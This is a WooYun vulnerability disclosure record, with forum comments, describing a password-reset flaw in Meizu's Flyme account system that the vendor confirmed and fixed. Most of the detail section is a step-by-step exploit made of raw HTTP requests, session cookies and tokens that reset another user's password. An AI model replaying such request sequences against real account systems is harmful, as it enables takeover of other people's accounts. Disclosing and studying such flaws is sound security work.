{"id": 49484, "wybug_id": "wooyun-2014-078208", "wybug_title": "魅族的账号系统内存在漏洞可导致任意账户的密码重置", "wybug_corp": "魅族科技", "wybug_author": "glzjin", "wybug_date": "2014-10-06 20:15", "wybug_open_date": "2014-11-20 20:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向公众公开  简要描述： 魅族的密码找回系统存在缺陷，可绕过验证码从而重置任意账号密码,进而导致隐私泄露等不良后果 详细说明：  请见下文的漏洞证明，猜测主要是由于对于密码重置模块令牌的验证不严造成的。   漏洞证明：  1.首先进入这里，魅族的密码重置模块https://member.meizu.com/forgetpwd2.然后我们需要获取的是四种功能模块的包，分别是发送验证码，验证验证码是否正确的，以及获取令牌和重置密码的，这里我都获取好了，接下来我们直接用发送验证码：\nPOST https://member.meizu.com/uc/system/vcode/sendEmailVcode HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 64Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=××××××××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: _fgpwdtk=AXTK4CkEUfVC_C1NDGumKyOL6r_8-5kM3oRskFNFuOjRX8Z-WKSowkbe1MkEq6uNUEqtX9fxR9wgFq9bOoEi73xsAVRurOfKThdEJiZEEeQ0ELOzCuIMJlm9YMpMQhdcQT8xwDBBRtV7z08WGayOKv0HJszxDvS3s0F0Zdx9-QM*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw5GNswWeGpzqQCFbdxcT_rLeVU4_l_MIS2c8C_NpSiowUz7LMNB3RG5mmu3InK7R9qAfPpI4Cb5hMh5Ynq13Vv11y46d4LW-AaGqon48D06CA; JSESSIONID=m11ira64bg3rb4n5u6oi1oln46memail=glzjin%40zhaojin97.cn&vCodeTypeValue=8&account=××××××××××××\n验证验证码是否正确：\nPOST https://member.meizu.com/uc/system/vcode/isValidEmailVCodeForForgetPwd HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 77Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=×××××××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: _fgpwdtk=AXTK4CkEUfVC_C1NDGumKyOL6r_8-5kM3oRskFNFuOjRX8Z-WKSowkbe1MkEq6uNUEqtX9fxR9wgFq9bOoEi73xsAVRurOfKThdEJiZEEeQ0ELOzCuIMJlm9YMpMQhdcQT8xwDBBRtV7z08WGayOKv0HJszxDvS3s0F0Zdx9-QM*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw5GNswWeGpzqQCFbdxcT_rLeVU4_l_MIS2c8C_NpSiowUz7LMNB3RG5mmu3InK7R9qAfPpI4Cb5hMh5Ynq13Vv11y46d4LW-AaGqon48D06CA; JSESSIONID=m11ira64bg3rb4n5u6oi1oln46maccount=×××××××××××&vCodeTypeValue=8&email=glzjin%40zhaojin97.cn&vcode=707054\n获取令牌：\nPOST https://member.meizu.com/security/resubmit/token/get HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 0Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=×××××××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: JSESSIONID=m11ira64bg3rb4n5u6oi1oln46m; _fgpwdtk=PUF6F7bafqhWDa7pLRN-9G8pLVkM-ZOBb4lWiGtpuE7mpSGuCe0xElXwO059Ix2M35TSAUSgLDa2ZjDCKav3_hBcJObQo4580cuHuVw9nYOxsLJzyqRR5Tuoqmf0cEYG0TstMaLoTDOl4IqMOf3epsmhdjWMBKQCaZscRQa0xfs*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw4n6yE2ipq2dz-CtbX82Vj0Oad4x92et5f9vMdPm4hHI8jUZhujmD1YhvTHdQwnP583IuC0_lbQ23FJm0i5vQhRky9fCc0moGahkWAVTl_MXA\n重置密码：\nPOST https://member.meizu.com/uc/system/webjsp/forgetpwd/resetPwd HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 125Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=×××××××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: _fgpwdtk=PUF6F7bafqhWDa7pLRN-9G8pLVkM-ZOBb4lWiGtpuE7mpSGuCe0xElXwO059Ix2M35TSAUSgLDa2ZjDCKav3_hBcJObQo4580cuHuVw9nYOxsLJzyqRR5Tuoqmf0cEYG0TstMaLoTDOl4IqMOf3epsmhdjWMBKQCaZscRQa0xfs*7MF-nQFGcjtSDNYJejrxOkDzzkQ5FE3WbW0o7UoYJw4n6yE2ipq2dz-CtbX82Vj0Oad4x92et5f9vMdPm4hHI8jUZhujmD1YhvTHdQwnP583IuC0_lbQ23FJm0i5vQhRky9fCc0moGahkWAVTl_MXA; JSESSIONID=m11ira64bg3rb4n5u6oi1oln46mform_resubmit_token_key=KH001S0NAMJE0HFNWTS2WNBTKDP57QVL&account=×××××××××××&resetPassword=laofuck&repeatPassword=laofuck\nOK，准备齐全了，下面就给大家做现场的表演1.首先我的目标账号是我朋友LANCE的账号（在这里特别感谢他允许我使用他的账号来测试）130××××××××2.同样的我们进入那个账号查找页面，然后这样把账号填进去，进到这个页面\n\n3.这时我们回到抓包那里，把COOKIE干出来\nCookie: Hm_lvt_2a0c04774115b182994cfcacf4c122e9=1412300296; Hm_lpvt_2a0c04774115b182994cfcacf4c122e9=1412300296; _ga=GA1.2.1012289249.1412300296; rememberLogin=; accountLogin=; passwordLogin=; _uid=; _keyLogin=; _uticket=; _islogin=; JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI\n这里我们需要的是这一段\nJSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI\n4.再拿出我们之前抓的找回密码那个包，我们替换些信息进去\nPOST https://member.meizu.com/uc/system/vcode/sendEmailVcode HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 64Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=15977441670Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMIemail=glzjin%40126.com&vCodeTypeValue=8&account=130‘********\n注意，我这里替换的是COOKIE以及下面的账号那里，邮箱你要填上自己的然后，就发送出去吧5.然后我们的邮箱里收到了这封东西130×××××××，您好：感谢您使用Flyme服务。您正在进行Flyme找回密码操作，请在30分钟内将此验证码：991344 输入验证码输入框，以完成验证。此致Flyme 项目组把上面的验证码记下，我们继续玩6.然后这里，我们来验证一下是否正确，同样的记住替换COOKIE和信息验证验证码是否正确：\nPOST https://member.meizu.com/uc/system/vcode/isValidEmailVCodeForForgetPwd HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 77Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toMail?account=×××××××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMIaccount=130××××××××&vCodeTypeValue=8&email=glzjin%40zhaojin97.cn&vcode=991344\n返回是错误的，但不要在意，我们继续走7.这时，我们来获取令牌了，记得把该替换的东西都替换了\nPOST https://member.meizu.com/security/resubmit/token/get HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 0Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Referer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=130×××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMI\n返回的是这些\n{\"code\":\"200\",\"message\":\"\",\"redirect\":\"\",\"value\":\"JUG2VL7VKRDDZ156UZSXQ92TIOFWUY0L\"}\n我们需要的是value8.然后，最后，我们替换好该替换的东西，重置密码吧！\nPOST https://member.meizu.com/uc/system/webjsp/forgetpwd/resetPwd HTTP/1.1Host: member.meizu.comConnection: keep-aliveContent-Length: 125Accept: application/json, text/javascript, */*; q=0.01Origin: https://member.meizu.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: https://member.meizu.com/uc/system/webjsp/forgetpwd/toResetPwd?account=130×××××××Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie:  JSESSIONID=m2cpjjkteivjxr1o9d646pcjgqs; _fgpwdtk=IuqfrXg2_z8GS2MV_eygPBPmC9phjbeIXUN01pHJz9zZGJkpRVduU7C95ufFwA9ce74hsTcsVI5aFdPKFXybfuBLnMQhZexixy2DxKvH0vIfwUeNTMVG3B3WZYfU1zbUZQPCV8aiLEh5yknycRLk2WbZMHkBL_x8Kz9iOb_pTcg*LKCpR-u2ekV3g8T9J7RVH6boDmDf_gHX1mOAEgJGgrAOiU4TVsjo-XvT2pEJ9PEC9R-80fnDs0kVLl7q9ZzXn6C0HkxUhP_erM2SGTJTck8iolS2tpXnVqnKPIxL1uTCdqik0LttUUwwUCEPKria-Ig0mWTbbTgWiolnJedESMIform_resubmit_token_key=JUG2VL7VKRDDZ156UZSXQ92TIOFWUY0L&account=130×××××××&resetPassword=xibaxiba&repeatPassword=xibaxiba\nOK，我们看到的，返回的是200和true,就是说我们成功的重置了密码9.登陆试试\n\n   修复方案：  加强各模块的验证\n\n   版权声明：转载请注明来源 glzjin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-10-06 21:14 厂商回复： 已通知相关人员进行处理。 最新状态： 2014-11-20：厂商已修复 2014-11-21：已修复  ", "replys": "漏洞评价：\n评论\n     2014-10-06 20:18 |    \t\tglzjin \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我是逗比)\t\t \n  - -暴汗。。。。十月三号的漏洞今天才发出来，不过魅族很负责，那天晚上就修好了    \n     2014-10-06 20:19 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @glzjin 完善下内容吧 你这个内容实在不忍直视    \n     2014-10-06 20:30 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @xsser 今天就大叔一个人审核吗？    \n     2014-10-06 20:31 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @scanf 是的 亲    \n     2014-10-06 20:41 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @xsser 其他可爱的审核呢？不会陪女友去了吧？-.-    \n     2014-10-06 21:10 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @xsser  WooYun: 魅族任意密码重置及后续分析  不一样的吗？    \n     2014-10-06 21:50 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  @魇 看洞主个人站，洞主很认真。    \n     2014-10-06 22:07 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @专业种田 感谢 看到了 不过好奇这样做 黄章不找他麻烦？    \n     2014-10-06 22:09 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @专业种田 @魇 这样不会出什么大事件吗、    \n     2014-10-06 22:14 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @scanf 感觉危险，通报厂商很正常，但是特地登号发帖就有点多余了    \n     2014-10-06 22:38 |    \t\tglzjin \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我是逗比)\t\t \n  楼上几位原谅我吧- -这就是我找漏洞的笔记- -当然有颜色的格式在这里 http://www.zhaojin97.cn/read-196.html 开头附送美图几张- -还有那天下午我怎么找都找不到他们，只有在他们论坛发了贴以后他们才鸟我    \n     2014-10-06 23:52 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  对啊@魇 而且国庆节响应慢是正常的啊@glzjin    \n     2014-10-08 12:55 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @glzjin 以后记得漏洞修了再弄出来啊    \n     2014-10-08 13:05 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  @xsser 这时候，这话说的棒!    \n     2014-10-08 14:17 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @魇 这还真叼，不怕被抓么。。。    \n     2014-10-29 11:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  魅族怎么那么多漏洞啊纠结    \n     2015-03-12 11:21 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  这个漏洞看得有点绕...大意是找回密码时，account没有和email绑定导致？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}